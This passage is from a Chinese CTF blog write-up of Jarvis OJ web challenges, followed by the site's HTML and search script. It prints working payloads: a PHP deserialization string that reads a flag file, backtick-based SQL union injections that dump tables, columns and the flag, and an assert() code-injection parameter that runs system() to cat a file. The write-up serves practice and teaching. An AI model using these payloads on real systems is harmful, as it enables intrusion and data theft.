+<p>继续读取<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>文件，对应payload如下:<br><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:89:\&quot;var_dump(file_get_contents(&#39;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&#39;));\&quot;;}</code></p>
+<p>得到flag<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\48.JPG" alt></p>
+<hr>
+<h1 id="0x14-WEB"><a href="#0x14-WEB" class="headerlink" title="0x14 WEB?"></a>0x14 WEB?</h1><p>题目描述:</p>
+<blockquote>
+<p>这么简单的题，是WEB吗？<br>题目入口：<a href="http://web.jarvisoj.com:9891/" target="_blank" rel="noopener">http://web.jarvisoj.com:9891/</a></p>
+</blockquote>
+<p>好像是个找源码解线性方程的题，留着，后面做。</p>
+<hr>
+<h1 id="0x15-61dctf-admin"><a href="#0x15-61dctf-admin" class="headerlink" title="0x15 [61dctf]admin"></a>0x15 [61dctf]admin</h1><p>题目描述:</p>
+<blockquote>
+<p>题目入口：<a href="http://web.jarvisoj.com:32792/" target="_blank" rel="noopener">http://web.jarvisoj.com:32792/</a></p>
+</blockquote>
+<p>点击题目去，发现只显示<code>hello world</code>，于是找源码和请求头、响应头，看看有没有提示。结果都没找到，于是用御剑扫一下后台，发现存在<code>robots.txt</code></p>
+<p>访问<code>robots.txt</code>,内容为<code>Disallow: /admin_s3cr3t.php</code>。于是继续访问<code>/admin_s3cr3t.php</code>，直接就得到flag了<code>flag{hello guest}</code>，wtf? 提交一下居然还真是正确的。。好吧</p>
+<hr>
+<h1 id="0x16-61dctf-inject"><a href="#0x16-61dctf-inject" class="headerlink" title="0x16 [61dctf]inject"></a>0x16 [61dctf]inject</h1><p>题目描述:</p>
+<blockquote>
+<p>题目入口：<a href="http://web.jarvisoj.com:32794/" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/</a><br>Hint1: 先找到源码再说吧~~</p>
+</blockquote>
+<p>提示说先找到源码再说，于是试一试常见的备份文件临时文件名，比如<code>.bak、.swp、.save、~</code>等，最后在<code>index.php~</code>找到，源码如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>到这里其实只要了解mysql里面反引号的一些使用细节即可做出此题，不多说，看参考文章吧，<a href="https://blog.csdn.net/qq_38780085/article/details/79905892" target="_blank" rel="noopener">mysql反引号和单引号区别</a></p>
+<p>关键语句说明如下</p>
+<blockquote>
+<p>desc &#96;table1&#96; &#96;table2&#96;<br>像上面的sql语句，如果table1存在的话，该语句就不会报错</p>
+</blockquote>
+<p>看回该题的源码，第4行我们可以控制传入的table参数注入desc语句，从而绕过判断。<br>比如输入 ?table=test&#96; &#96;union select database() limit 1,1<br>这个时候，index.php处理代码里面第4行会变成 </p>
+<blockquote>
+<p>desc &#96;secret_test&#96; &#96;union select database() limit 1,1</p>
+</blockquote>
+<p>因为secret_test存在，第4行会往下执行而不是跳去Hacker函数。第5行会变成</p>
+<blockquote>
+<p>select ‘flag{xxx}’ from secret_test&#96; &#96;union select database() limit 1,1</p>
+</blockquote>
+<p>之前总结mysql绕过waf的时候，提到过反引号可以代替空格，此处就是这么个作用，所以我们可以传入union语句结合limit限制，输出我们想要注入的语句执行结果。这里limit 1,1是因为，<code>select &#39;flag{xxx}&#39; from sercet_test</code>只返回一个查询结果，所以并上union后，union后面并列的查询语句结果从1开始，即<code>limt 1,n</code></p>
+<p>我们输入 ?table=test&#96; &#96;union select database() limit 1,1 测试一下<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\49.jpg" alt></p>
+<p>得到了预期结果，接下来就是union素质三连击，爆表、爆列、爆flag。payload分别如下:</p>
+<blockquote>
+<p>爆表：?table=test&#96; &#96;union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\50.jpg" alt></p>
+<p>爆列：?table=test&#96; &#96;union select group_concat(column_name) from information_schema.columns where table_schema=database() limit 1,1<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\51.jpg" alt></p>
+<p>爆flag：?table=test&#96; &#96;union select group_concat(flagUwillNeverKnow) from secret_flag limit 1,1<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\52.jpg" alt></p>
+</blockquote>
+<hr>
+<h1 id="0x17-61dctf-register"><a href="#0x17-61dctf-register" class="headerlink" title="0x17 [61dctf]register"></a>0x17 [61dctf]register</h1><p>题目描述:</p>
+<blockquote>
+<p>题目入口：<a href="http://web.jarvisoj.com:32796/" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/</a><br>Hint1: 二次注入<br>Hint2: register 二次注入在country</p>
+</blockquote>
+<p>这题有点顶，先留着，后面再来写。</p>
+<hr>
+<h1 id="0x18-61dctf-babyphp"><a href="#0x18-61dctf-babyphp" class="headerlink" title="0x18 [61dctf]babyphp"></a>0x18 [61dctf]babyphp</h1><p>题目描述:</p>
+<blockquote>
+<p>题目入口：<a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/</a></p>
+</blockquote>
+<p>题目点进去是一个博客，把该点的按钮链接都点点掉，发现了一些信息。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\53.jpg" alt></p>
+<p>说用到了git，这就想到了git源码泄露，于是搜索学习一波，<a href="https://sp4rta.github.io/2018/02/13/git-leakage/" target="_blank" rel="noopener">Git泄露的总结</a></p>
+<p>访问<code>http://web.jarvisoj.com:32798/.git/</code>，显示403 Forbidden，说明应该是存在.git目录的，于是用Githack下载一下源码。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\54.jpg" alt></p>
+<p>源码目录里有一个flag.php，打开看看有没有flag，结果当然是没有，这里的flag被注释掉了。于是只能看一下index.php的代码，index.php部分代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到有两行assert语句，所以就想到了代码注入。因为我们能控制<code>$page</code>变量从而影响<code>$file</code>变量，所以此处可以进行注入。第一个assert语句可以写成如下形式<br><code>assert(&quot;strpos(&#39;templates/{$page}.php&#39;, &#39;..&#39;) === false&quot;)</code>，当 <code>$page=flag&#39;.system(&quot;ls ./&quot;).&#39;</code> 时<br>该语句变为<code>assert(&quot;strpos(&#39;template/flag&#39;.system(&quot;ls ./&quot;).&#39;php&#39;,&#39;..&#39;)===false)</code>，即<code>$file</code>变量变为了三个字符串拼接的结果。从而达到执行system函数的目的</p>
+<p>所以最终payload：<code>?page=flag&#39;.system(&quot;cat templates/flag.php&quot;).&#39;</code>，然后再在查看网页源代码里找到flag<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\55.jpg" alt></p>
+<hr>
+<h1 id="0x19-61dctf-babyxss"><a href="#0x19-61dctf-babyxss" class="headerlink" title="0x19 [61dctf]babyxss"></a>0x19 [61dctf]babyxss</h1><p>题目描述:</p>
+<blockquote>
+<p>题目入口：<a href="http://web.jarvisoj.com:32800/" target="_blank" rel="noopener">http://web.jarvisoj.com:32800/</a><br>Hint1: csp bypass</p>
+</blockquote>
+<p>以后来做。。</p>
+<hr>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>ヾﾉ≧∀≦)o 来呀！快活呀！~</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById(&quot;QR&quot;); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="Miracle778 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Miracle778 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          
+            <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          
+            <a href="/tags/Jarvis-OJ/" rel="tag"><i class="fa fa-tag"></i> Jarvis OJ</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Study/PHP/Laravel-5-8/Laravel-5-8学习.html" rel="next" title="Laravel-5.8学习">
+                <i class="fa fa-chevron-left"></i> Laravel-5.8学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  <div>
+    
+    <div>
+    
+    <div style="text-align:center;color: #000;font-size:17px; font-family:STLiti;">
+	-------- 本文结束 --------
+	</div>
+<div style="border: 1px solid black">
+<div style="margin-left:10px">
+<p style="font-size: 10px;line-height: 30px"><a href="https://miracle778.github.io" style="color:#258FC6">Miracle's Blog</a> by <a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a> is licensed under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">Creative Commons BY-NC-ND 4.0 International License</a>.
+<br>
+由<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a>创作并维护的<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778's Blog</a>博客采用<a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">创作共用保留署名-非商业-禁止演绎4.0国际许可证</a>。<br>
+本文首发于<a href="https://miracle.github.io" style="color:#258FC6">Miracle's Blog</a> 博客（ <a href="https://miracle778.github.io" style="color:#258FC6">https://miracle778.github.io</a> ），版权所有，侵权必究。</p>
+</div>
+</div>
+    
+</div>
+
+    
+ </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/米兔.jpg" alt="Miracle778">
+            
+              <p class="site-author-name" itemprop="name">Miracle778</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">19</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">27</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">35</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Miracle778" title="GitHub &rarr; https://github.com/Miracle778" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:Yiitao@163.com" title="E-Mail &rarr; mailto:Yiitao@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+          
+          <br>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=29045579&auto=0&height=32"></iframe>
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-PORT51"><span class="nav-number">2.</span> <span class="nav-text">0x01 PORT51</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-LOCALHOST"><span class="nav-number">3.</span> <span class="nav-text">0x02 LOCALHOST</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-Login"><span class="nav-number">4.</span> <span class="nav-text">0x03 Login</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-神盾局的秘密"><span class="nav-number">5.</span> <span class="nav-text">0x04 神盾局的秘密</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-IN-A-Mess"><span class="nav-number">6.</span> <span class="nav-text">0x05 IN A Mess</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-RE"><span class="nav-number">7.</span> <span class="nav-text">0x06 RE?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07-flag在管理员手里"><span class="nav-number">8.</span> <span class="nav-text">0x07 flag在管理员手里</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x08-Chopper"><span class="nav-number">9.</span> <span class="nav-text">0x08 Chopper</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x09-Easy-Gallery"><span class="nav-number">10.</span> <span class="nav-text">0x09 Easy Gallery</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x10-Simple-Injection"><span class="nav-number">11.</span> <span class="nav-text">0x10 Simple Injection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x11-api调用"><span class="nav-number">12.</span> <span class="nav-text">0x11 api调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x12-图片上传漏洞"><span class="nav-number">13.</span> <span class="nav-text">0x12 图片上传漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x13-PHPINFO"><span class="nav-number">14.</span> <span class="nav-text">0x13 PHPINFO</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x14-WEB"><span class="nav-number">15.</span> <span class="nav-text">0x14 WEB?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x15-61dctf-admin"><span class="nav-number">16.</span> <span class="nav-text">0x15 [61dctf]admin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x16-61dctf-inject"><span class="nav-number">17.</span> <span class="nav-text">0x16 [61dctf]inject</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x17-61dctf-register"><span class="nav-number">18.</span> <span class="nav-text">0x17 [61dctf]register</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x18-61dctf-babyphp"><span class="nav-number">19.</span> <span class="nav-text">0x18 [61dctf]babyphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x19-61dctf-babyxss"><span class="nav-number">20.</span> <span class="nav-text">0x19 [61dctf]babyxss</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Miracle778</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">214k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">3:14</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'w9nX4X8WpdsRFrCFoTt7cpqz-gzGzoHsz',
+    appKey: 'H3aV3vWVqkmAgeD0ep6RVf07',
+    placeholder: 'ヾﾉ≧∀≦)o 来呀！快活呀！~',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn'
+  });
+</script>
+
+
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
